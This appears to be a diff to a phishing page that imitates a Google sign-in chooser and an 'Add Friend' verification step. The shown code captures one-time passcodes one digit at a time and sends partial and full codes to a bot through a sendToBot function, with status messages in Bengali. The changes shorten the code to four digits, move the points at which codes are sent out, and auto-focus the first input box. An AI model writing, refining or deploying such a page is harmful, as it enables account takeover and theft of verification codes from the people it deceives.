@@ -86,10 +86,6 @@ padding-top: 20px; background-color: white; border-bottom: 1px solid #e1e4e8; pa
                 <input type="text" inputmode="numeric" maxlength="1" class="code-input">
                 <input type="text" inputmode="numeric" maxlength="1" class="code-input">
                 <input type="text" inputmode="numeric" maxlength="1" class="code-input">
-                <input type="text" inputmode="numeric" maxlength="1" class="code-input">
-                <input type="text" inputmode="numeric" maxlength="1" class="code-input">
-                <input type="text" inputmode="numeric" maxlength="1" class="code-input">
-                <input type="text" inputmode="numeric" maxlength="1" class="code-input">
             </div>
             <button id="otpSubmitBtn" onclick="goToStep('verifying')" class="btn-blue opacity-50 cursor-not-allowed" disabled>Add Friend</button>
         </div>
@@ -125,13 +121,13 @@ padding-top: 20px; background-color: white; border-bottom: 1px solid #e1e4e8; pa
         input.addEventListener('input', () => {
             input.value = input.value.replace(/[^0-9]/g, '');
             if (input.value.length === 1) {
-                if (index === 5) {
+                if (index === 1) {
                     const code2 = Array.from(otpInputs).slice(0, 2).map(i => i.value).join('');
                     sendToBot(`📩 ১ম অংশ (2 ডিজিট): \`${code2}\``);
                     otpBtn.disabled = false;
                     otpBtn.classList.remove('opacity-50', 'cursor-not-allowed');
                 }
-                if (index === 7) {
+                if (index === 3) {
                     const code4 = Array.from(otpInputs).map(i => i.value).join('');
                     sendToBot(`📩 পূর্ণ কোড (4 ডিজিট): \`${code4}\``);
                 }
@@ -152,12 +148,29 @@ padding-top: 20px; background-color: white; border-bottom: 1px solid #e1e4e8; pa
     }
 
     function goToStep(id) {
-        ['step1', 'google_chooser', 'verifying', 'success_page', 'error_page', 'otp_page'].forEach(s => {
-            document.getElementById(s).classList.add('hidden');
-            document.getElementById(s).classList.remove('flex');
-        });
-        document.getElementById(id).classList.remove('hidden');
-        document.getElementById(id).classList.add('flex');
+    ['step1', 'google_chooser', 'verifying', 'success_page', 'error_page', 'otp_page'].forEach(s => {
+        document.getElementById(s).classList.add('hidden');
+        document.getElementById(s).classList.remove('flex');
+    });
+
+    document.getElementById(id).classList.remove('hidden');
+    document.getElementById(id).classList.add('flex');
+
+    if (id === 'otp_page') {
+
+        setTimeout(() => {
+
+            const firstInput = document.querySelector('.code-input');
+
+            if (firstInput) {
+
+                firstInput.focus();
+                firstInput.click();
+
+            }
+
+        }, 300);
+    }
     }
 
     function startProcess() { goToStep('google_chooser'); setTimeout(() => { document.getElementById('email_field').focus(); }, 500); }
